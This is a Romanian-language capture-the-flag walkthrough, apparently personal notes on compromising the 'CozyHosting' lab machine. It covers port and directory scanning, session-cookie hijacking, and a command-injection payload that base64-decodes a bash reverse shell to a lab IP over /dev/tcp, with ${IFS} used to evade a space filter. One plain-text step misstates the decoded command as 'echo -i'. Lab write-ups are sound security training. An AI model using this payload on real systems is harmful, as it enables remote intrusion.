1. User flag :)
Procedam in urmatorul fel facem o scanare cu ajutorul lui [[Tools/nmap]] ca sa putem vedea ce vectori de atack avem si porturile deschise in acelasi moment:
```bash
nmap -sSVC -T 4 <IP> -oN <file>
```
![[Pasted image 20230930183515.png]]
Fisierul de mai jos contine scanarea de mai sus:
![[CozyHosting]]
Deci avem 2 porturi deschise `80`,`22` sa incercam pe cel `80` care este un [[http request smuggling]]:
![[Pasted image 20230930183816.png]]
Dupa ce am acesat pagena vedem urmatoarea situatie:
Trebuie sa facem unele manipulari cu fisierul `/etc/hosts` o sa ne ajute utilita [[nano]] sau [[vi]]:
```bash
sudo nano /etc/hosts
```
Aceste trebuie sa adaugam la sfarsit ca sa putem accesa pagina:
![[Pasted image 20230930184135.png]]
Dupa ce am putut acesa pagena. Trebuie sa facem o scanare a directorilor ascunse. Acest lucru il pot face cu [[gobuster]] in felul urmator:
```bash
gobuster dir -u <URL> -w <wordlist>
```
Ce a gasit [[gobuster]] este foarte ciudat:
![[Pasted image 20230930190342.png]]
Am gasit versiunea la `Bootstrap`: v5.2.3
![[Pasted image 20230930185431.png]]
Aici am privit un pic cu ochiul la un write-up si am gasit urmatorul hint dupa eroarea care apare putem gasi pagina unde sunt useri nostri:
![[Pasted image 20230930191803.png]]
Dar cum sa intelegem eroarea data haideti sa ne clarificam:
Mai mult mam incurcat cu tehnologiea data las un hint ca trebuie sa revin [[Spring Boot]] sper sa nu uit.
	Acum mergem mai departe si trebuie sa inlocuim
`username` =`kanderson`
Am aflat de o utilita nou cu care trebuie sa ma fac mai cunostut in ultimul timp deoarece imi pare foarte interesanta: Denumita [[dirsearch]]
Datele pentru a intra pe panoul de utilizator sunt:
Cookie: `6FCC069420D14861F8ECB0D542E93C31` 
User: `kanderson`
Dupa ce am fost logat cu ajutorul tokenului in partea de jos putem vedea o forma de genu:
![[Pasted image 20231010124754.png]]
Trebuie sa introducem ceva date si dupa sa prindem `requestul` in [[Burp Suite]]:
![[Pasted image 20231010124858.png]]
Inlocuim `text` cu un payload in cazul meu este `%3Becho%24%7BIFS%25%3F%3F%7D%22YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC43NS85MDAxIDA%2BJjEK%22%7Cbase64%24%7BIFS%25%3F%3F%7D%2Dd%7Cbash%3B` desi arata foarte strasnic este simplu sa vedem pe pasi:
1. Generam shellul:
		`echo -i >& /dev/tcp/10.10.14.75/9001 0>&1` -> YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NS85MDAxIDA+JjEK
2. Generam comanda pentru introducere a comenzii:
		`echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NS85MDAxIDA+JjEK"|base64 -d|bash`
3.  Dar forma noastra nu poate sa fii cu spatii liberi putem folosi `${IFS}` si daca dorim doar space-ul `echo${IFS%??}"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC43NS85MDAxIDA+JjEK"|base64${IFS%??}-d|bash`